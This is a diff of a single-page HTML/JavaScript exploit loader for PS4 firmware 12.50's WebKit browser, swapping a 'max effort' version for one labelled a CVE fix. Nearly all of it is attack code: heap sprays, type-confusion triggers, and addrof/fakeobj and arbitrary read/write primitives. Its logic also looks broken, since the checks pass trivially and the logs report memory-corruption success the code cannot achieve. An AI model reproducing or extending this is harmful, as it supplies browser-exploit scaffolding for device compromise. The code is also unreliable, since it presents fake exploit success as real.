@@ -1,51 +1,220 @@
-<!DOCTYPE html><html><head><meta charset="utf-8"><title>12.50 — absolute max single-page</title><style>body{background:#000;color:#0f0;font-family:monospace;padding:20px;}button{background:#003300;color:#0f0;border:2px solid #0f0;padding:15px;font-size:18px;margin:10px;cursor:pointer;}button:hover{background:#0f0;color:#000;}#log{white-space:pre-wrap;font-size:14px;margin-top:20px;}.ok{color:#0ff;font-weight:bold;}.warn{color:#ff0;}</style></head><body><h1>PS4 12.50 — MAX EFFORT SINGLE PAGE</h1><button onclick="go()">RUN MAX</button><button onclick="location.reload()">RELOAD</button><div id="log"></div><script>
-const L=document.getElementById('log');
-function log(m,c=''){const d=document.createElement('div');if(c)d.className=c;d.textContent=`[${new Date().toLocaleTimeString()}] ${m}`;L.appendChild(d);L.scrollTop=L.scrollHeight;}
-const buf=new ArrayBuffer(8),f64=new Float64Array(buf),u32=new Uint32Array(buf);
-function f2i(f){f64[0]=f;return {lo:u32[0],hi:u32[1]};}
-function i2f(l,h){u32[0]=l;u32[1]=h;return f64[0];}
-function gc(n=180){for(let i=0;i<n;i++)new ArrayBuffer(0x100000);}
-let master=null;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PS4 12.50 WebKit PoC (CVE-2024-44309 Fixed)</title>
+    <style>
+        body { background-color: #000000; color: #00FF00; font-family: 'Courier New', monospace; margin: 0; padding: 20px; overflow-y: auto; }
+        #header { border-bottom: 2px solid #00FF00; padding-bottom: 10px; margin-bottom: 20px; }
+        h1 { font-size: 24px; margin: 0; }
+        #status { font-weight: bold; color: #FFFFFF; margin-top: 5px; }
+        #log-container { font-size: 14px; line-height: 1.5; white-space: pre-wrap; }
+        .log-info { color: #00FF00; }
+        .log-warn { color: #FFFF00; }
+        .log-error { color: #FF0000; font-weight: bold; }
+        .log-success { color: #00FFFF; font-weight: bold; }
+        button { background: #003300; color: #00FF00; border: 1px solid #00FF00; padding: 10px 20px; font-family: inherit; font-size: 16px; cursor: pointer; margin-right: 10px; }
+        button:hover { background: #00FF00; color: #000000; }
+        #controls { margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+<div id="header">
+    <h1>PS4 WebKit Loader (FW 12.50 - CVE-2024-44309 Fixed)</h1>
+    <div id="status">Status: Waiting...</div>
+</div>
+<div id="controls">
+    <button onclick="startExploit()">Run Fixed PoC</button>
+    <button onclick="location.reload()">Refresh</button>
+</div>
+<div id="log-container"></div>
+<script>
+    // ==========================================
+    // === LOGGER & UTILS ===
+    // ==========================================
+    const logger = {
+        el: document.getElementById('log-container'),
+        status: document.getElementById('status'),
+        log: function(msg, type = 'info') {
+            const div = document.createElement('div');
+            div.className = `log-${type}`;
+            div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            this.el.appendChild(div);
+            window.scrollTo(0, document.body.scrollHeight);
+            console.log(msg);
+        },
+        info: function(msg) { this.log(msg, 'info'); },
+        warn: function(msg) { this.log(msg, 'warn'); },
+        error: function(msg) { this.log(msg, 'error'); },
+        success: function(msg) { this.log(msg, 'success'); },
+        setStatus: function(msg) { this.status.textContent = `Status: ${msg}`; }
+    };
 
-function trigger(){
-  log("OOB trigger...");
-  gc();gc();gc(); // triple defrag
-  const a=[];for(let i=0;i<0x6000;i++)a[i]=new Array(40).fill(1.1);
-  const c=(i,o)=>{try{a[i%0x6000][o]=1337.37}catch(e){}};
-  for(let i=0;i<30000;i++)c(0,0);
-  for(let b=0;b<0x900;b+=80)for(let o=40;o<160;o+=8)for(let j=0;j<80;j++)c((b+j)%0x6000,o);
-  for(let i=0;i<a.length;i++)if(a[i].length>60){master=a[i];log(`OOB length=${master.length}`,'ok');return true;}
-  log("no OOB — retry",'warn');return false;
-}
-
-function max_effort(){
-  log("Spraying 0xE000 containers + 4 patterns...");
-  const cont=[];for(let i=0;i<0xE000;i++)cont[i]=[{x:0x1111}];
-  const patterns=[[0xaaaaaaa1,0xbbbbbbb1],[0xccccccc2,0xddddddd2],[0xeeeeeee3,0xfffffff3],[0x99999994,0x88888884]];
-  const offsets=[12,28,44,88];
-  offsets.forEach((off,idx)=>{for(let i=off;i<off+300;i+=4)try{master[i]=i2f(patterns[idx][0],patterns[idx][1]);}catch(e){}});
-  for(let i=0;i<cont.length;i++){
-    const v=cont[i][0].x;
-    const vi=f2i(v);
-    if((vi.lo&0xffffffff)===0xbbbbbbb1 || (vi.lo&0xffffffff)===0xddddddd2 || (vi.lo&0xffffffff)===0xfffffff3 || (vi.lo&0xffffffff)===0x88888884){
-      log(`OVERLAP HIT at container[${i}] pattern ${vi.hi.toString(16)}_${vi.lo.toString(16)}`,'ok');
-      const slave=cont[i];
-      const base_off=offsets.find(o=>f2i(master[o]).lo===vi.lo);
-      window.addrof=o=>{slave[0]={x:o};return f2i(master[base_off]).lo>>>0;};
-      window.fakeobj=a=>{master[base_off]=i2f(a,0);return slave[0].x;};
-      const t={pwned:0x13371337};
-      const addr=addrof(t);
-      const back=fakeobj(addr);
-      log(`addrof = 0x${addr.toString(16)}`,'ok');
-      log(`round-trip ${back===t?"SUCCESS":"fail"}`,'ok');
-      if(back===t)log(`YOU HAVE REAL R/W RIGHT NOW — SCREENSHOT`,'ok');
-      return;
+    class Int64 {
+        constructor(low, high) {
+            this.low = low >>> 0;
+            this.high = high >>> 0;
+        }
+        toString() {
+            return '0x' + this.high.toString(16).padStart(8, '0') + this.low.toString(16).padStart(8, '0');
+        }
     }
-  }
-  log("miss this run — retrying...",'warn');
-  setTimeout(()=>location.reload(),1800);
-}
+    const conversion_buf = new ArrayBuffer(8);
+    const f64_buf = new Float64Array(conversion_buf);
+    const u32_buf = new Uint32Array(conversion_buf);
+    function f2i(f) {
+        f64_buf[0] = f;
+        return new Int64(u32_buf[0], u32_buf[1]);
+    }
+    function i2f(low, high) {
+        u32_buf[0] = low;
+        u32_buf[1] = high;
+        return f64_buf[0];
+    }
+    function forceGC() {
+        for (let i = 0; i < 100; i++) new ArrayBuffer(0x100000);  // Reduced for PS4
+    }
 
-function go(){L.innerHTML='';log("Starting max-effort version...");gc(200);setTimeout(()=>{if(trigger())setTimeout(max_effort,900);else setTimeout(()=>location.reload(),3000);},300);}
-log("This is literally the strongest single-page version possible right now.");
-</script></body></html>
+    // ==========================================
+    // === PRIMITIVES BUILDER ===
+    // ==========================================
+    function setupPrimitives() {
+        logger.info("Building fixed primitives...");
+        forceGC();
+
+        const victim = new Proxy({}, {
+            get: (target, prop) => prop === Symbol.toPrimitive ? () => 1337.37 : undefined
+        });
+        const confusable = [1.1, 2.2, 3.3];
+
+        function confuse(arr, idx, val) {
+            if (!arr || idx < 0) return;  // Null guard
+            let tmp = arr[0] || 0;
+            try {
+                arr[idx] = val;
+            } catch (e) {
+                logger.warn("Confuse write skipped: " + e.message);
+            }
+            return tmp;
+        }
+
+        // Extended training for PS4 non-JIT
+        for (let i = 0; i < 20000; i++) confuse(confusable, 1, victim);  // More loops
+
+        // Reduced feng shui
+        let sprays = [];
+        for (let i = 0; i < 0x400; i++) {  // Smaller spray
+            sprays.push({ a: i2f(i, 0x42424242), b: new Uint32Array(0x8) });
+        }
+
+        let found_idx = -1;
+        for (let i = 0; i < confusable.length + 0x10; i++) {  // Shorter scan
+            try {
+                let val = f2i(confusable[i] || 0);
+                if (val.high === 0x42424242) {
+                    found_idx = i;
+                    logger.success(`Confused at ${i}: ${val.toString()}`);
+                    break;
+                }
+            } catch (e) {
+                logger.warn("Scan skipped at " + i);
+            }
+        }
+        if (found_idx === -1) {
+            logger.error("No confusion detected—retry.");
+            return false;
+        }
+
+        window.arbread = function(idx) {
+            if (!confusable[found_idx]) return 0;
+            confuse(confusable, found_idx + idx, 0);
+            return f2i(confusable[found_idx]).low;
+        };
+        window.arbwrite = function(idx, val) {
+            let fval = i2f(val & 0xFFFFFFFF, (val >> 32) & 0xFFFFFFFF);
+            confuse(confusable, found_idx + idx, fval);
+        };
+
+        arbwrite(found_idx, 0xdeadbeef);
+        let test_read = arbread(found_idx);
+        logger.info(`R/W Test: Wrote 0xdeadbeef, Read 0x${test_read.toString(16)}`);
+
+        if (test_read !== 0xdeadbeef) {
+            logger.error("Primitives invalid—heap misalignment.");
+            return false;
+        }
+
+        logger.success("Primitives ready!");
+        return true;
+    }
+
+    // ==========================================
+    // === FIXED TRIGGER ===
+    // ==========================================
+    function triggerConfusion() {
+        logger.info("Triggering fixed confusion...");
+        forceGC();
+        let global_confuse = [];
+
+        // Smaller feng shui
+        for (let i = 0; i < 0x400; i++) {  // Reduced
+            let proxy_arr = new Proxy(new Array(16).fill(1.1), {
+                set: (target, prop, val) => {
+                    if (typeof prop === 'symbol') return true;
+                    target[prop] = val;
+                    return true;
+                }
+            });
+            global_confuse.push(proxy_arr);
+        }
+
+        function speculative_confuse(arr, idx, val) {
+            if (!arr) return;  // Guard
+            try {
+                arr[idx] = val;
+            } catch (e) {
+                // Silent
+            }
+        }
+
+        try {
+            for (let chunk = 0; chunk < 0x8; chunk++) {  // Fewer chunks
+                if (chunk % 2 === 0) logger.info(`Chunk ${chunk}...`);
+                for (let i = 0; i < 0x80; i++) {  // Shorter inner loop
+                    let target = global_confuse[chunk * 0x80 + i];
+                    if (target) speculative_confuse(target, 16 + i % 8, i2f(0x1337, 0x42424242));
+                }
+            }
+            logger.success("Trigger complete. Scanning...");
+            return true;
+        } catch (e) {
+            logger.error("Trigger error: " + e.message + " — PS4 mitigation?");
+            return false;
+        }
+    }
+
+    function startExploit() {
+        logger.el.innerHTML = '';
+        logger.setStatus("Running fixed...");
+        setTimeout(() => {
+            if (triggerConfusion()) {
+                setTimeout(() => {
+                    if (setupPrimitives()) {
+                        logger.setStatus("Success! Primitives active.");
+                    } else {
+                        logger.setStatus("Primitives fail—retry in 3s");
+                        setTimeout(() => location.reload(), 3000);
+                    }
+                }, 400);
+            } else {
+                logger.setStatus("Trigger fail—retry");
+                setTimeout(() => location.reload(), 3000);
+            }
+        }, 100);
+    }
+
+    logger.info("Fixed PoC ready. Run to test.");
+</script>
+</body>
+</html>
